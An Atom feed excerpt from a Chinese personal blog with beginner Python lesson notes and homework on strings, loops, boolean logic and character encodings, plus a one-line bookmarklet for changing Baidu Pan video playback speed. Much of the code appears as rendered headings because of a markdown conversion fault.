<h1 id="s6-s16">s6 = s1[6:]</h1>
<h1 id="prints6">print(s6)</h1>
<h1 id="-2"></h1>
<h1 id="切片步长"># 切片步长</h1>
<h1 id="s7-s152">s7 = s1[:5:2]</h1>
<h1 id="prints7">print(s7)</h1>
<h1 id="prints1">print(s1[:])</h1>
<h1 id="倒序"># 倒序：</h1>
<h1 id="s8-s1-1-6-1">s8 = s1[-1:-6:-1]</h1>
<h1 id="prints8">print(s8)</h1>
<h1 id="按索引s1index">按索引：s1[index]</h1>
<h1 id="按照切片-s1start_index-end_index1">按照切片： s1[start_index: end_index+1]</h1>
<h1 id="按照切片步长-s1start_index-end_index12">按照切片步长： s1[start_index: end_index+1:2]</h1>
<h1 id="反向按照切片步长-s1start_index-end_index后延一位2">反向按照切片步长： s1[start_index: end_index后延一位:2]</h1>
<h1 id="思考题倒序全部取出来">思考题：倒序全部取出来？</h1>
<p>s = 'taiBAifdsa'</p>
<h1 id="字符串的常用操作方法">字符串的常用操作方法</h1>
<h1 id="不会对原字符串进行任何操作都是产生一个新的字符串">不会对原字符串进行任何操作，都是产生一个新的字符串</h1>
<h1 id="upper-lower">upper lower</h1>
<h1 id="s1-supper">s1 = s.upper()</h1>
<h1 id="s1-slower"># s1 = s.lower()</h1>
<h1 id="prints1types1">print(s1,type(s1))</h1>
<h1 id="应用">应用：</h1>
<h1 id="username-input用户名">username = input('用户名')</h1>
<h1 id="password-input密码">password = input('密码')</h1>
<h1 id="code-qwea">code = 'QweA'</h1>
<h1 id="printcode">print(code)</h1>
<h1 id="your_code-input请输入验证码不区分大小写">your_code = input('请输入验证码：不区分大小写')</h1>
<h1 id="if-your_codeupper-codeupper">if your_code.upper() == code.upper():</h1>
<h1 id="if-username-太白-and-password-123">if username == '太白' and password == '123':</h1>
<h1 id="print登录成功">print('登录成功')</h1>
<h1 id="else">else:</h1>
<h1 id="print用户名密码错误">print('用户名密码错误')</h1>
<h1 id="else-2">else:</h1>
<h1 id="print验证码错误">print('验证码错误')</h1>
<h1 id="-3"></h1>
<h1 id="startswith-endswith">startswith endswith</h1>
<h1 id="printsstartswitht">print(s.startswith('t'))  ***</h1>
<h1 id="printsstartswithtaibai">print(s.startswith('taiBAi'))  ***</h1>
<h1 id="了解">了解</h1>
<h1 id="printsstartswithb36">print(s.startswith('B',3,6))</h1>
<h1 id="replace">replace</h1>
<p>msg = 'alex 很nb,alex是老男孩教育的创始人之一，alex长得很帅'</p>
<h1 id="msg1-msgreplacealex太白-默认全部替换">msg1 = msg.replace('alex','太白')  # 默认全部替换</h1>
<h1 id="msg1-msgreplacealex太白2">msg1 = msg.replace('alex','太白',2)</h1>
<h1 id="printmsg">print(msg)</h1>
<h1 id="printmsg1">print(msg1)</h1>
<h1 id="strip空白空格t-n">strip:空白：空格，\t \n</h1>
<h1 id="s4-n太白t">s4 = '  \n太白\t'</h1>
<h1 id="prints4-2"># print(s4)</h1>
<h1 id="s5-s4strip">s5 = s4.strip()</h1>
<h1 id="prints5-2">print(s5)</h1>
<h1 id="了解-2">了解</h1>
<h1 id="可以去除指定的字符">可以去除指定的字符</h1>
<h1 id="s4-rre太r白qsd">s4 = 'rre太r白qsd'</h1>
<h1 id="s5-s4stripqrsed">s5 = s4.strip('qrsed')</h1>
<h1 id="prints5-3">print(s5)</h1>
<h1 id="split-非常重要">split  非常重要</h1>
<h1 id="默认按照空格分隔返回一个列表">默认按照空格分隔，返回一个列表</h1>
<h1 id="指定分隔符">指定分隔符</h1>
<h1 id="str-list">str ---&gt; list</h1>
<h1 id="s6-太白-女神-吴超">s6 = '太白 女神 吴超'</h1>
<h1 id="s6-太白女神吴超">s6 = '太白:女神:吴超'</h1>
<h1 id="l-s6split">l = s6.split('😂</h1>
<h1 id="printl">print(l)</h1>
<h1 id="了解-3">了解：</h1>
<h1 id="s6-barrynvshenwu">s6 = ':barry:nvshen:wu'</h1>
<h1 id="prints6split"># print(s6.split('😂)</h1>
<h1 id="prints6split2">print(s6.split(&quot;:&quot;,2))</h1>
<h1 id="join-非常好用">join 非常好用</h1>
<h1 id="s1-alex">s1 = 'alex'</h1>
<h1 id="s2-joins1">s2 = '+'.join(s1)</h1>
<h1 id="prints2types2-2">print(s2,type(s2))</h1>
<h1 id="l1-太白-女神-吴超">l1 = ['太白', '女神', '吴超']</h1>
<h1 id="前提列表里面的元素必须都是str类型"># 前提：列表里面的元素必须都是str类型</h1>
<h1 id="s3-joinl1">s3 = ':'.join(l1)</h1>
<h1 id="prints3-2">print(s3)</h1>
<h1 id="count">count</h1>
<h1 id="s8-sdfsdagsfdagfdhgfhgfhfghfdagsaa">s8 = 'sdfsdagsfdagfdhgfhgfhfghfdagsaa'</h1>
<h1 id="prints8counta">print(s8.count('a'))</h1>
<h1 id="format-格式化输出">format: 格式化输出</h1>
<h1 id="第一种用法"># 第一种用法：</h1>
<h1 id="msg-我叫今年性别format大壮25男">msg = '我叫{}今年{}性别{}'.format('大壮',25,'男')</h1>
<h1 id="第二种用法">第二种用法：</h1>
<h1 id="msg-我叫0今年1性别2我依然叫0format大壮-25男">msg = '我叫{0}今年{1}性别{2}我依然叫{0}'.format('大壮', 25,'男')</h1>
<h1 id="printmsg-2">print(msg)</h1>
<h1 id="第三种用法">第三种用法：</h1>
<h1 id="a-100">a = 100</h1>
<h1 id="msg-我叫name今年age性别sexformatageasex男name大壮">msg = '我叫{name}今年{age}性别{sex}'.format(age=a,sex='男',name='大壮')</h1>
<h1 id="printmsg-3">print(msg)</h1>
<h1 id="is-系列">is 系列：</h1>
<h1 id="name-taibai123">name = 'taibai123'</h1>
<h1 id="name-1001">name = '100①'</h1>
<h1 id="printnameisalnum-字符串由字母或数字组成"># print(name.isalnum()) #字符串由字母或数字组成</h1>
<h1 id="printnameisalpha-字符串只由字母组成"># print(name.isalpha()) #字符串只由字母组成</h1>
<h1 id="printnameisdecimal-字符串只由十进制组成">print(name.isdecimal()) #字符串只由十进制组成</h1>
<h1 id="s1-input请输入您的金额">s1 = input('请输入您的金额：')</h1>
<h1 id="if-s1isdecimal">if s1.isdecimal():</h1>
<h1 id="printints1">print(int(s1))</h1>
<h1 id="else-3">else:</h1>
<h1 id="print输入有误">print('输入有误')</h1>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[pythonday03（作业）]]></title>
        <id>https://itxz.fun/post/pythonday03zuo-ye/</id>
        <link href="https://itxz.fun/post/pythonday03zuo-ye/">
        </link>
        <updated>2020-04-22T09:20:20.000Z</updated>
        <content type="html"><![CDATA[<h1 id="while-true"># while True:</h1>
<h1 id="print1">#     print(1)</h1>
<h1 id=""></h1>
<h1 id="-2"></h1>
<h1 id="-3">'''</h1>
<h1 id="如何终止循环">如何终止循环？</h1>
<h1 id="1标志位">1，标志位</h1>
<h1 id="-4">'''</h1>
<h1 id="n-true"># n = True</h1>
<h1 id="while-n"># while n:</h1>
<h1 id="print111">#     print(111)</h1>
<h1 id="print222">#     print(222)</h1>
<h1 id="n-false">#     n = False</h1>
<h1 id="print333">#     print(333)</h1>
<h1 id="-5"></h1>
<h1 id="break-直接终止循环"># break: 直接终止循环</h1>
<h1 id="continue终止本次循环继续下一次循环"># continue：终止本次循环，继续下一次循环</h1>
<h1 id="-6">'''</h1>
<h1 id="while-else">while  else:</h1>
<h1 id="-7">'''</h1>
<h1 id="-8"></h1>
<h1 id="-9"></h1>
<h1 id="day2作业及默写">Day2作业及默写</h1>
<h1 id="-10"></h1>
<h1 id="1-判断下列逻辑语句的truefalse">1. 判断下列逻辑语句的True,False.</h1>
<h1 id="11-1-or-3-4-or-4-5-and-2-1-and-9-8-or-7-6">1）1 &gt; 1 or 3 &lt; 4 or 4 &gt; 5 and 2 &gt; 1 and 9 &gt; 8 or 7 &lt; 6</h1>
<h1 id="2not-2-1-and-3-4-or-4-5-and-2-1-and-9-8-or-7-6">2）not 2 &gt; 1 and 3 &lt; 4 or 4 &gt; 5 and 2 &gt; 1 and 9 &gt; 8 or 7 &lt; 6</h1>
<h1 id="2-求出下列逻辑语句的值">2. 求出下列逻辑语句的值。</h1>
<h1 id="18-or-3-and-4-or-2-and-0-or-9-and-7">1),8 or 3 and 4 or 2 and 0 or 9 and 7</h1>
<h1 id="20-or-2-and-3-and-4-or-6-and-0-or-3">2),0 or 2 and 3 and 4 or 6 and 0 or 3</h1>
<h1 id="3-下列结果是什么">3. 下列结果是什么？</h1>
<h1 id="1-6-or-2-1">1)、6 or 2 &gt; 1</h1>
<h1 id="2-3-or-2-1">2)、3 or 2 &gt; 1</h1>
<h1 id="3-0-or-5-4">3)、0 or 5 &lt; 4</h1>
<h1 id="4-5-4-or-3">4)、5 &lt; 4 or 3</h1>
<h1 id="5-2-1-or-6">5)、2 &gt; 1 or 6</h1>
<h1 id="6-3-and-2-1">6)、3 and 2 &gt; 1</h1>
<h1 id="7-0-and-3-1">7)、0 and 3 &gt; 1</h1>
<h1 id="8-2-1-and-3">8)、2 &gt; 1 and 3</h1>
<h1 id="9-3-1-and-0">9)、3 &gt; 1 and 0</h1>
<h1 id="10-3-1-and-2-or-2-3-and-3-and-4-or-3-2">10)、3 &gt; 1 and 2 or 2 &lt; 3 and 3 and 4 or 3 &gt; 2</h1>
<h1 id="4-while循环语句基本结构">4. while循环语句基本结构？</h1>
<h1 id="5-利用while语句写出猜大小的游戏">5. 利用while语句写出猜大小的游戏：</h1>
<h1 id="设定一个理想数字比如66让用户输入数字如果比66大则显示猜测的结果大了如果比66小则显示猜测的结果小了只有等于66显示猜测结果正确然后退出循环">设定一个理想数字比如：66，让用户输入数字，如果比66大，则显示猜测的结果大了；如果比66小，则显示猜测的结果小了;只有等于66，显示猜测结果正确，然后退出循环。</h1>
<h1 id="6-在5题的基础上进行升级">6. 在5题的基础上进行升级：</h1>
<h1 id="给用户三次猜测机会如果三次之内猜测对了">给用户三次猜测机会，如果三次之内猜测对了，</h1>
<h1 id="则显示猜测正确退出循环">则显示猜测正确，退出循环，</h1>
<h1 id="如果三次之内没有猜测正确">如果三次之内没有猜测正确，</h1>
<h1 id="则自动退出循环并显示太笨了你">则自动退出循环，并显示‘太笨了你....’。</h1>
<h1 id="while">while</h1>
<h1 id="3-次">3 次</h1>
<h1 id="input">input</h1>
<h1 id="if-elif-else">if elif else</h1>
<h1 id="count-1">count = 1</h1>
<h1 id="while-count-4">while count &lt; 4:</h1>
<h1 id="num-intinput请输入数字">num = int(input('请输入数字：'))</h1>
<h1 id="if-num-66">if num &gt; 66:</h1>
<h1 id="print猜大了">print('猜大了')</h1>
<h1 id="elif-num-66">elif num &lt; 66:</h1>
<h1 id="print猜小了">print('猜小了')</h1>
<h1 id="else">else:</h1>
<h1 id="print恭喜你猜对了">print('恭喜你猜对了')</h1>
<h1 id="break">break</h1>
<h1 id="count-1-2">count += 1</h1>
<h1 id="else-2">else:</h1>
<h1 id="print太笨了">print('太笨了')</h1>
<h1 id="7-使用while循环输出-1-2-3-4-5-6-8-9-10">7. 使用while循环输出 1 2 3 4 5 6 8 9 10</h1>
<h1 id="count-1-3">count = 1</h1>
<h1 id="while-count-11">while count &lt; 11:</h1>
<h1 id="if-count-7">if count == 7:</h1>
<h1 id="print">print('')</h1>
<h1 id="else-3">else:</h1>
<h1 id="printcount">print(count)</h1>
<h1 id="count-1-4">count += 1</h1>
<h1 id="count-1-5">count = 1</h1>
<h1 id="while-count-11-2">while count &lt; 11:</h1>
<h1 id="if-count-7-2">if count == 7:</h1>
<h1 id="pass">pass</h1>
<h1 id="else-4">else:</h1>
<h1 id="printcount-2">print(count)</h1>
<h1 id="count-1-6">count += 1</h1>
<h1 id="count-1-7">count = 1</h1>
<h1 id="while-count-11-3"># while count &lt; 11:</h1>
<h1 id="if-count-7-3">#     if count == 7:</h1>
<h1 id="count-1-8">#         count += 1</h1>
<h1 id="printcount-3">#     print(count)</h1>
<h1 id="count-1-9">#     count += 1</h1>
<h1 id="count-0">count = 0</h1>
<h1 id="while-count-10">while count &lt; 10:</h1>
<h1 id="count-1-10">count += 1</h1>
<h1 id="if-count-7-4">if count == 7:</h1>
<h1 id="continue">continue</h1>
<h1 id="printcount-4">print(count)</h1>
<h1 id="8-求1-100的所有数的和">8. 求1-100的所有数的和</h1>
<h1 id="9-输出-1-100-内的所有奇数">9. 输出 1-100 内的所有奇数</h1>
<h1 id="10-输出-1-100-内的所有偶数">10. 输出 1-100 内的所有偶数</h1>
<h1 id="11-求1-23-45-99的所有数的和">11. 求1-2+3-4+5 ... 99的所有数的和</h1>
<h1 id="count-1-11">count = 1</h1>
<h1 id="s-0">s = 0</h1>
<h1 id="while-count-100">while count &lt; 100:</h1>
<h1 id="if-count-2-0">if count % 2 == 0:</h1>
<h1 id="s-s-count">s = s - count</h1>
<h1 id="else-5">else:</h1>
<h1 id="s-s-count-2">s = s + count</h1>
<h1 id="count-1-12">count += 1</h1>
<h1 id="prints">print(s)</h1>
<h1 id="12-用户登录三次输错机会且每次输错误时显示剩余错误次数提示使用字符串格式化">12. 用户登录（三次输错机会）且每次输错误时显示剩余错误次数（提示：使用字符串格式化）</h1>
<h1 id="count-1-13">count = 1</h1>
<h1 id="while-count-3">while count &lt;= 3:</h1>
<h1 id="username-input用户名">username = input('用户名')</h1>
<h1 id="password-input密码">password = input('密码')</h1>
<h1 id="if-username-alex-and-password-123">if username == 'alex' and password == '123':</h1>
<h1 id="print登录成功">print('登录成功')</h1>
<h1 id="else-6">else:</h1>
<h1 id="print用户名或者密码错误还剩s机会-3-count">print('用户名或者密码错误,还剩%s机会' % (3-count))</h1>
<h1 id="count-count-1">count = count + 1</h1>
<h1 id="13-简述ascii-unicode-utf-8编码">13. 简述ASCII、Unicode、utf-8编码</h1>
<h1 id="14-简述位和字节的关系">14. 简述位和字节的关系？</h1>
<h1 id="-11"></h1>
<h1 id="-12"></h1>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[度盘倍速方法]]></title>
        <id>https://itxz.fun/post/du-pan-bei-su-fang-fa/</id>
        <link href="https://itxz.fun/post/du-pan-bei-su-fang-fa/">
        </link>
        <updated>2020-04-20T01:28:29.000Z</updated>
        <content type="html"><![CDATA[<p>javascript:videojs.getPlayers(&quot;video-player&quot;) .html5player.tech_.setPlaybackRate(2)</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[python02]]></title>
        <id>https://itxz.fun/post/python02/</id>
        <link href="https://itxz.fun/post/python02/">
        </link>
        <updated>2020-04-10T09:43:46.000Z</updated>
        <content type="html"><![CDATA[<p>day02<br>
day2 内容大纲</p>
<ol>
<li>
<h2 id="今日内容大纲">今日内容大纲</h2>
<ul>
<li>pycharm的安装以及简单使用
<ul>
<li>辅助开发软件，代码逐行调试，设置高端，不会提示，你在书写代码时，他不提示，debug的模式，最好用的还是pycharm。</li>
</ul>
</li>
<li><strong>格式化输出</strong></li>
<li><strong>while循环</strong></li>
<li>运算符  and or not</li>
<li>编码的初识</li>
</ul>
</li>
<li>
<h2 id="昨日内容回顾">昨日内容回顾</h2>
<ul>
<li>
<p>编译型与解释型</p>
<ul>
<li>编译型：一次性编译成2进制，在执行
<ul>
<li>优点：执行效率高</li>
<li>缺点：不能跨平台，开发效率低</li>
<li>代表语言：C</li>
</ul>
</li>
<li>解释型：逐行解释成二进制，在执行
<ul>
<li>优点：可以跨平台，开发效率高</li>
<li>缺点：执行效率低。
<ul>
<li>代表语言：python</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>变量：</p>
<ul>
<li>
<p>数字，字母，下划线任意组合。</p>
</li>
<li>
<p>不能以数字开头。</p>
</li>
<li>
<p>不能用Python的关键字：print if...</p>
</li>
<li>
<p>不能使用中文。</p>
</li>
<li>
<p>描述性。</p>
</li>
<li>
<p>区分变量与数据类型的区别。</p>
</li>
<li>
<pre><code class="language-python">name = 'Alex'
name = '太白'
print(name)
name = 'wusir'
print(name)
</code></pre>
</li>
</ul>
</li>
<li>
<p>常量</p>
<ul>
<li>一直不变的量，与变量几乎一样。</li>
</ul>
</li>
<li>
<p>注释：解释说明</p>
</li>
<li>
<p>基础数据类型：</p>
<ul>
<li>1， 2， 3， 4000，int 数字， +-*/ % ** ....</li>
<li>'fdsalk中国'   str  字符串  +   *int</li>
<li>True False   bool 布尔值</li>
</ul>
</li>
<li>
<p>用户输入input</p>
</li>
<li>
<pre><code>name = input('&gt;&gt;&gt;')
print(type(name))
</code></pre>
</li>
<li>
<p>if</p>
<ul>
<li>
<p>if  条件:</p>
</li>
<li>
<p>if  else:</p>
</li>
<li>
<p>if elif elif .....</p>
</li>
<li>
<p>if elif elif ..... else</p>
</li>
<li>
<p>if  嵌套</p>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="3-今日内容">3. 今日内容</h2>
<ol>
<li>
<p>while 循环</p>
<ul>
<li>
<p>why：大气循环， 吃饭，上课，睡觉，日复一日，歌曲列表循序环，程序中：输入用户名密码，</p>
</li>
<li>
<p>what：while 无限循环。</p>
</li>
<li>
<p>how：</p>
<ol>
<li>
<p>基本结构：</p>
<pre><code class="language-python">while 条件:
    循环体
</code></pre>
</li>
<li>
<p>初识循环</p>
<pre><code class="language-python">while True:
    print('狼的诱惑')
    print('我们不一样')
    print('月亮之上')
    print('庐州月')
    print('人间')
    
</code></pre>
</li>
<li>
<p>基本原理：</p>
<figure data-type="image" tabindex="1"><img src="C:%5CUsers%5Coldboy%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1556418225772.png" alt="1556418225772" loading="lazy"></figure>
</li>
<li>
<p>循环如何终止？</p>
<ol>
<li>
<p>改变条件。</p>
<pre><code class="language-python">flag = True
while flag:
    print('狼的诱惑')
    print('我们不一样')
    print('月亮之上')
    flag = False
    print('庐州月')
    print('人间')

</code></pre>
<pre><code class="language-python"># 练习题： 1~ 100 所有的数字
count = 1
flag = True
while flag:
    print(count)
    count = count + 1
    if count == 101:
        flag = False
        
count = 1
while count &lt; 101:
    print(count)
    count = count + 1

</code></pre>
<pre><code class="language-python"># 1 + 2 + 3 + ...... 100  的最终结果：

s = 0
count = 1
while count &lt; 101:
    s = s + count
    count = count + 1
print(s)

</code></pre>
</li>
</ol>
<p>​</p>
<ol start="2">
<li>break</li>
</ol>
<pre><code class="language-python"># while True:
#     print('狼的诱惑')
#     print('我们不一样')
#     print('月亮之上')
#     break
#     print('庐州月')
#     print('人间')
# print(111)
</code></pre>
<ol start="3">
<li>
<p>系统命令（今天不讲）</p>
</li>
<li>
<p>continue</p>
<pre><code class="language-python"># continue ： 退出本次循环，继续下一次循环
flag = True
while flag:
    print(111)
    print(222)
    flag = False
    continue
    print(333)

</code></pre>
<pre><code class="language-python"># while else： while 循环如果被break打断，则不执行else语句。
count = 1
while count &lt; 5:
    print(count)
    if count == 2:
        break
    count = count + 1
else:
    print(666)
</code></pre>
</li>
</ol>
</li>
</ol>
</li>
<li>
<p>where： 你需要重复之前的动作，输入用户名密码，考虑到while循环。</p>
</li>
</ul>
</li>
<li>
<p>格式化输出</p>
<ul>
<li>当你遇到这样的需求：字符串中想让某些位置变成动态可传入的，首先要考虑到格式化输出。</li>
</ul>
</li>
<li>
<p>运算符：算数运算符 + -，比较运算符 &gt; ==，赋值运算符=,+=,逻辑运算符，and or， 成员运算符。</p>
<pre><code class="language-python">i1 = 2
i2 = 3
print(2 ** 3)
print(10 // 3)
print(10 % 3)

print(3 != 4)

count = 1
count = count + 1
count += 1
print(count)

</code></pre>
<pre><code class="language-python"># and or not

# 1 在没有()的情况下，优先级：not &gt; and &gt; or，同一优先级从左至右依次计算
# 情况1：两边都是比较运算
# print(2 &gt; 1 and 3 &lt; 4 or 4 &gt; 5 and 2 &lt; 1)
# print(True or False)

# 情况2：两边都是整数
'''
x or y , x为真，值就是x，x为假，值是y
'''
# print(1 or 2)
# print(3 or 2)
# print(4 or 2)
# print(-1 or 2)
# print(0 or 2)

# print(1 and 2)

</code></pre>
<p>数据类型之间的转换</p>
<pre><code class="language-python"># str ---&gt; int  : 只能是纯数字组成的字符串
s1 = '00100'
print(int(s1))
# int ----&gt; str
i1 = 100
print(str(i1),type(str(i1)))

# int  ---&gt; bool  : 非零即True ，0为False。
i = 0
print(bool(i))
# bool ---&gt; int
print(int(True))  # 1
print(int(False))  # 0

</code></pre>
</li>
<li>
<p>编码的初识<strong>重点</strong></p>
</li>
</ol>
<p>计算机存储文件，存储数据，以及将一些数据信息通过网络发送出去，存储发送数据什么内容？底层都是01010101.</p>
<p>我带这张珵穿越，1937，我俩研究电报：</p>
<p>真正密码本：</p>
<p>​		滴滴      走</p>
<p>​	滴滴滴       跑</p>
<p>第一版： 没有段位，</p>
<p>​	101		     今</p>
<p>​	1101            晚</p>
<p>​	1                吃</p>
<p>​	11		     鸡</p>
<p>1011101111</p>
<p>第二版：</p>
<p>​	0000101		     今</p>
<p>​	0001101             晚</p>
<p>​	0000001             吃</p>
<p>​	0000011		     鸡</p>
<p>0000101	0001101	0000001	0000011</p>
<p>密码本：01010110 二进制与 文字之间的对应关系。</p>
<p>最早起的密码本：</p>
<p>​	ASCII码：只包含：英文字母，数字，特殊字符。</p>
<p>0000 0001  ：             a</p>
<p>0000 0101  ：             ;</p>
<p>8bit == 1byte</p>
<p>'hello123':   8byte</p>
<p>gbk: 英文字母，数字，特殊字符和中文。国标</p>
<p>一个英文字母：      0000 0001  ：             a</p>
<p>一个中文 中：        0000 0001  0100 0001  ： 中</p>
<p>Unicode: 万国码：把世界上所有的文字都记录到这个密码本。</p>
<p>​	起初一个字符用2个字节表示：</p>
<p>0000 0001  0000 0011：             a</p>
<p>0000 0001  0100 0001  ：           中</p>
<p>后来为了涵盖全部文字：</p>
<p>0000 0001  0000 0011  0000 0001  0000 0011：             a</p>
<p>0000 0001  0100 0001  0000 0001  0000 0011  ：           中</p>
<p>浪费空间，浪费资源。</p>
<p>Utf-8:升级：最少用8bit1个字节表示一个字符。</p>
<p>​	0000 0011：             				a   1字节</p>
<p>​	0000 0011 0000 0011   		欧洲 2个字节</p>
<p>0000 0011 0000 0011 0000 0011         中： 3个字节。</p>
<h1 id="重点"><strong>重点：</strong></h1>
<p>'中国12he'  ： GBK:    8个字节</p>
<p>'中国12he'  ： UTF-8:    10个字节</p>
<pre><code>8bit = 1byte
1024byte = 1KB
1024KB = 1MB
1024MB = 1GB
1024GB = 1TB
1024TB = 1PB
1024TB = 1EB
1024EB = 1ZB
1024ZB = 1YB
1024YB = 1NB
1024NB = 1DB    
</code></pre>
<p>7.6MB  ----&gt; 7.6 * 1024 * 1024 * 8</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[python]]></title>
        <id>https://itxz.fun/post/python/</id>
        <link href="https://itxz.fun/post/python/">
        </link>
        <updated>2020-04-10T09:34:25.000Z</updated>
        <content type="html"><![CDATA[<p>day01<br>
. 用户交互input</p>
<pre><code>why:	网页上，app 输入账号与密码。

what： 用户交互input

how：

```python
# input: 出来的全部都是字符串类型。
username = input('请输入用户名：')
password = input('请输入密码：')
print(username,type(username))
print(password,type(password))
```
</code></pre>
<p>流程控制语句if</p>
<pre><code>why:  生活中选择，回家，n条路，你走那条路，取决于心情。

what: if。

how：

+ 基本结构：

+ ```
  if 条件:
      结果
      
  # c: if{条件}{结果}
  ```

1.  单独if

   ```python
   print(111)
   if 2 &lt; 1:
       print(666)
       print(333)
   print(222)
   ```

   

2. if else 二选一

   ```python 
   s1 = '100'
   i1 = int(s1)
   print(i1,type(l1))
   
   age = input('请输入年龄：')
   if int(age) &gt; 18:
       print('恭喜你，成年了')
   else:
       print('小屁孩儿')
   
   ```

3. if elif elif .... 多选一

   ```python
   num = int(input('猜点数：'))
   
   if num == 1:
       print('晚上请你吃饭')
   elif num == 3:
       print('一起溜达')
   elif num == 2:
       print('请你大宝剑')
   ```

   

4. if elif elif .... else 多选一

   ```python
   num = int(input('猜点数：'))
   
   if num == 1:
       print('晚上请你吃饭')
   	
   elif num == 3:
       print('一起溜达')
   	
   elif num == 2:
       print('请你大宝剑')
   else:
       print('太笨了....')
   
   print('组合')
   ```

   

5. 嵌套的if

   ```python
   
   username = input('请输入用户名：')
   password = input('请输入密码：')
   code = 'qwer'
   your_code = input('请输入验证码：')
   
   if your_code == code:
       if username == 'taibai' and password == '123':
   	    print('登录成功')
       else:
   	    print('账号或者密码错误')
   else:
       print('验证码错误')
   ```</code></pre>
]]></content>
    </entry>
</feed>